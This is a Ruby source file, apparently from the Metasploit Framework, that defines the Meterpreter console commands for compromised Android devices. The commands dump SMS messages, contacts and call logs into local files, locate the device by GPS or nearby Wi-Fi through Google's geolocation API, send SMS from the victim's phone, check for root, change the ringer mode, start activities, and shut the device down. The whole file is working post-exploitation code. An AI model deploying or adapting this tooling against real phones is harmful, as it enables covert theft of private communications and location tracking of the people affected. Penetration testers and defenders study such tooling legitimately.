# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'msf/core/auxiliary/report'
require 'rex/google/geolocation'
require 'date'

module Rex
module Post
module Meterpreter
module Ui
###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###
class Console::CommandDispatcher::Android
  include Console::CommandDispatcher
  include Msf::Auxiliary::Report

  #
  # List of supported commands.
  #
  def commands
    all = {
      'dump_sms'          => 'Get sms messages',
      'dump_contacts'     => 'Get contacts list',
      'geolocate'         => 'Get current lat-long using geolocation',
      'dump_calllog'      => 'Get call log',
      'check_root'        => 'Check if device is rooted',
      'device_shutdown'   => 'Shutdown device',
      'send_sms'          => 'Sends SMS from target session',
      'wlan_geolocate'    => 'Get current lat-long using WLAN information',
      'interval_collect'  => 'Manage interval collection capabilities',
      'activity_start'    => 'Start an Android activity from a Uri string',
      'set_audio_mode'    => 'Set Ringer Mode'
    }

    reqs = {
      'dump_sms'         => ['dump_sms'],
      'dump_contacts'    => ['dump_contacts'],
      'geolocate'        => ['geolocate'],
      'dump_calllog'     => ['dump_calllog'],
      'check_root'       => ['check_root'],
      'device_shutdown'  => ['device_shutdown'],
      'send_sms'         => ['send_sms'],
      'wlan_geolocate'   => ['wlan_geolocate'],
      'interval_collect' => ['interval_collect'],
      'activity_start'   => ['activity_start'],
      'set_audio_mode'   => ['set_audio_mode']
    }

    # Ensure any requirements of the command are met
    all.delete_if do |cmd, _desc|
      reqs[cmd].any? { |req| !client.commands.include?(req) }
    end
  end

  def interval_collect_usage
    print_line('Usage: interval_collect <parameters>')
    print_line
    print_line('Specifies an action to perform on a collector type.')
    print_line
    print_line(@@interval_collect_opts.usage)
  end

  def cmd_interval_collect(*args)
      @@interval_collect_opts ||= Rex::Parser::Arguments.new(
        '-h' => [false, 'Help Banner'],
        '-a' => [true, "Action (required, one of: #{client.android.collect_actions.join(', ')})"],
        '-c' => [true, "Collector type (required, one of: #{client.android.collect_types.join(', ')})"],
        '-t' => [true, 'Collect poll timeout period in seconds (default: 30)']
      )

      opts = {
        action:  nil,
        type:    nil,
        timeout: 30
      }

      @@interval_collect_opts.parse(args) do |opt, idx, val|
        case opt
        when '-a'
          opts[:action] = val.downcase
        when '-c'
          opts[:type] = val.downcase
        when '-t'
          opts[:timeout] = val.to_i
          opts[:timeout] = 30 if opts[:timeout] <= 0
        end
      end

      unless client.android.collect_actions.include?(opts[:action])
        interval_collect_usage
        return
      end

      type = args.shift.downcase

      unless client.android.collect_types.include?(opts[:type])
        interval_collect_usage
        return
      end

      result = client.android.interval_collect(opts)
      if result[:headers].length > 0 && result[:entries].length > 0
        header = "Captured #{opts[:type]} data"

        if result[:timestamp]
          time = Time.at(result[:timestamp]).to_datetime
          header << " at #{time.strftime('%Y-%m-%d %H:%M:%S')}"
        end

        table = Rex::Ui::Text::Table.new(
          'Header'    => header,
          'SortIndex' => 0,
          'Columns'   => result[:headers],
          'Indent'    => 0
        )

        result[:entries].each do |e|
          table << e
        end

        print_line
        print_line(table.to_s)
      else
        print_good('Interval action completed successfully')
      end
  end

  def cmd_device_shutdown(*args)
    seconds = 0
    device_shutdown_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-t' => [ false, 'Shutdown after n seconds']
    )

    device_shutdown_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        print_line('Usage: device_shutdown [options]')
        print_line('Shutdown device.')
        print_line(device_shutdown_opts.usage)
        return
      when '-t'
        seconds = val.to_i
      end
    end

    res = client.android.device_shutdown(seconds)

    if res
      print_status("Device will shutdown #{seconds > 0 ? ('after ' + seconds + ' seconds') : 'now'}")
    else
      print_error('Device shutdown failed')
    end
  end

  def cmd_set_audio_mode(*args)
    help = false
    mode = 1
    set_audio_mode_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, "Help Banner" ],
      '-m' => [ true, "Set Mode - (0 - Off, 1 - Normal, 2 - Max) (Default: '#{mode}')"]
    )

    set_audio_mode_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        help = true
      when '-m'
        mode = val.to_i
      else
        help = true
      end
    end

    if help || mode < 0 || mode > 2
      print_line('Usage: set_audio_mode [options]')
      print_line('Set Ringer mode.')
      print_line(set_audio_mode_opts.usage)
      return
    end

    client.android.set_audio_mode(mode)
    print_status("Ringer mode was changed to #{mode}!")
  end

  def cmd_dump_sms(*args)
    path = "sms_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
    dump_sms_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-o' => [ false, 'Output path for sms list']
    )

    dump_sms_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        print_line('Usage: dump_sms [options]')
        print_line('Get sms messages.')
        print_line(dump_sms_opts.usage)
        return
      when '-o'
        path = val
      end
    end

    sms_list = client.android.dump_sms

    if sms_list.count > 0
      print_status("Fetching #{sms_list.count} sms #{sms_list.count == 1 ? 'message' : 'messages'}")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n=====================\n"
        data << "[+] SMS messages dump\n"
        data << "=====================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        sms_list.each_with_index do |a, index|
          data << "##{index.to_i + 1}\n"

          type = 'Unknown'
          if a['type'] == '1'
            type = 'Incoming'
          elsif a['type'] == '2'
            type = 'Outgoing'
          end

          status = 'Unknown'
          if a['status'] == '-1'
            status = 'NOT_RECEIVED'
          elsif a['status'] == '1'
            status = 'SME_UNABLE_TO_CONFIRM'
          elsif a['status'] == '0'
            status = 'SUCCESS'
          elsif a['status'] == '64'
            status = 'MASK_PERMANENT_ERROR'
          elsif a['status'] == '32'
            status = 'MASK_TEMPORARY_ERROR'
          elsif a['status'] == '2'
            status = 'SMS_REPLACED_BY_SC'
          end

          data << "Type\t: #{type}\n"

          time = a['date'].to_i / 1000
          time = Time.at(time)

          data << "Date\t: #{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
          data << "Address\t: #{a['address']}\n"
          data << "Status\t: #{status}\n"
          data << "Message\t: #{a['body']}\n\n"
        end

        ::File.write(path, data)
        print_status("SMS #{sms_list.count == 1 ? 'message' : 'messages'} saved to: #{path}")

        return true
      rescue
        print_error("Error getting messages: #{$ERROR_INFO}")
        return false
      end
    else
      print_status('No sms messages were found!')
      return false
    end
  end

  def cmd_dump_contacts(*args)
    path = "contacts_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"

    dump_contacts_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-o' => [ false, 'Output path for contacts list']
    )

    dump_contacts_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        print_line('Usage: dump_contacts [options]')
        print_line('Get contacts list.')
        print_line(dump_contacts_opts.usage)
        return
      when '-o'
        path = val
      end
    end

    contact_list = client.android.dump_contacts

    if contact_list.count > 0
      print_status("Fetching #{contact_list.count} #{contact_list.count == 1 ? 'contact' : 'contacts'} into list")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n======================\n"
        data << "[+] Contacts list dump\n"
        data << "======================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        contact_list.each_with_index do |c, index|

          data << "##{index.to_i + 1}\n"
          data << "Name\t: #{c['name']}\n"

          c['number'].each do |n|
            data << "Number\t: #{n}\n"
          end

          c['email'].each do |n|
            data << "Email\t: #{n}\n"
          end

          data << "\n"
        end

        ::File.write(path, data)
        print_status("Contacts list saved to: #{path}")

        return true
      rescue
        print_error("Error getting contacts list: #{$ERROR_INFO}")
        return false
      end
    else
      print_status('No contacts were found!')
      return false
    end
  end

  def cmd_geolocate(*args)

    generate_map = false
    geolocate_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-g' => [ false, 'Generate map using google-maps']
    )

    geolocate_opts.parse(args) do |opt, _idx, _val|
      case opt
      when '-h'
        print_line('Usage: geolocate [options]')
        print_line('Get current location using geolocation.')
        print_line(geolocate_opts.usage)
        return
      when '-g'
        generate_map = true
      end
    end

    geo = client.android.geolocate

    print_status('Current Location:')
    print_line("\tLatitude:  #{geo[0]['lat']}")
    print_line("\tLongitude: #{geo[0]['long']}\n")
    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}&sensor=true\n")

    if generate_map
      link = "https://maps.google.com/maps?q=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}"
      print_status("Generated map on google-maps:")
      print_status(link)
      Rex::Compat.open_browser(link)
    end

  end

  def cmd_dump_calllog(*args)
    path = "calllog_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
    dump_calllog_opts = Rex::Parser::Arguments.new(

      '-h' => [ false, 'Help Banner' ],
      '-o' => [ false, 'Output path for call log']

    )

    dump_calllog_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        print_line('Usage: dump_calllog [options]')
        print_line('Get call log.')
        print_line(dump_calllog_opts.usage)
        return
      when '-o'
        path = val
      end
    end

    log = client.android.dump_calllog

    if log.count > 0
      print_status("Fetching #{log.count} #{log.count == 1 ? 'entry' : 'entries'}")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n=================\n"
        data << "[+] Call log dump\n"
        data << "=================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        log.each_with_index do |a, index|
          data << "##{index.to_i + 1}\n"
          data << "Number\t: #{a['number']}\n"
          data << "Name\t: #{a['name']}\n"
          data << "Date\t: #{a['date']}\n"
          data << "Type\t: #{a['type']}\n"
          data << "Duration: #{a['duration']}\n\n"
        end

        ::File.write(path, data)
        print_status("Call log saved to #{path}")

        return true
      rescue
        print_error("Error getting call log: #{$ERROR_INFO}")
        return false
      end
    else
      print_status('No call log entries were found!')
      return false
    end
  end

  def cmd_check_root(*args)

    check_root_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ]
    )

    check_root_opts.parse(args) do |opt, _idx, _val|
      case opt
      when '-h'
        print_line('Usage: check_root [options]')
        print_line('Check if device is rooted.')
        print_line(check_root_opts.usage)
        return
      end
    end

    is_rooted = client.android.check_root

    if is_rooted
      print_good('Device is rooted')
    else
      print_status('Device is not rooted')
    end
  end

  def cmd_send_sms(*args)
    send_sms_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-d' => [ true, 'Destination number' ],
      '-t' => [ true, 'SMS body text' ],
      '-dr' => [ false, 'Wait for delivery report' ]
    )

    dest = ''
    body = ''
    dr = false

    send_sms_opts.parse(args) do |opt, _idx, val|
      case opt
      when '-h'
        print_line('Usage: send_sms -d <number> -t <sms body>')
        print_line('Sends SMS messages to specified number.')
        print_line(send_sms_opts.usage)
        return
      when '-d'
        dest = val
      when '-t'
        body = val
      when '-dr'
        dr = true
      end
    end

    if dest.to_s.empty? || body.to_s.empty?
      print_error("You must enter both a destination address -d and the SMS text body -t")
      print_error('e.g. send_sms -d +351961234567 -t "GREETINGS PROFESSOR FALKEN."')
      print_line(send_sms_opts.usage)
      return
    end

    sent = client.android.send_sms(dest, body, dr)
    if dr
      if sent[0] == "Transmission successful"
        print_good("SMS sent - #{sent[0]}")
      else
        print_error("SMS send failed - #{sent[0]}")
      end
      if sent[1] == "Transmission successful"
        print_good("SMS delivered - #{sent[1]}")
      else
        print_error("SMS delivery failed - #{sent[1]}")
      end
    else
      if sent == "Transmission successful"
        print_good("SMS sent - #{sent}")
      else
        print_error("SMS send failed - #{sent}")
      end
    end
  end

  def cmd_wlan_geolocate(*args)
    wlan_geolocate_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ]
    )

    wlan_geolocate_opts.parse(args) do |opt, _idx, _val|
      case opt
      when '-h'
        print_line('Usage: wlan_geolocate')
        print_line('Tries to get device geolocation from WLAN information and Google\'s API')
        print_line(wlan_geolocate_opts.usage)
        return
      end
    end

    log = client.android.wlan_geolocate
    wlan_list = []
    log.each do |x|
      mac = x['bssid']
      ssid = x['ssid']
      ss = x['level']
      wlan_list << [mac, ssid, ss.to_s]
    end

    if wlan_list.to_s.empty?
      print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
      return
    end
    g = Rex::Google::Geolocation.new

    wlan_list.each do |wlan|
      g.add_wlan(*wlan)
    end
    begin
      g.fetch!
    rescue RuntimeError => e
      print_error("Error: #{e}")
    else
      print_status(g.to_s)
      print_status("Google Maps URL:  #{g.google_maps_url}")
    end
  end

  def cmd_activity_start(*args)
    if (args.length < 1)
      print_line("Usage: activity_start <uri>\n")
      print_line("Start an Android activity from a uri")
      return
    end

    uri = args[0]
    result = client.android.activity_start(uri)
    if result.nil?
      print_status("Intent started")
    else
      print_error("Error: #{result}")
    end
  end

  #
  # Name for this dispatcher
  #
  def name
    'Android'
  end
end
end
end
end
end
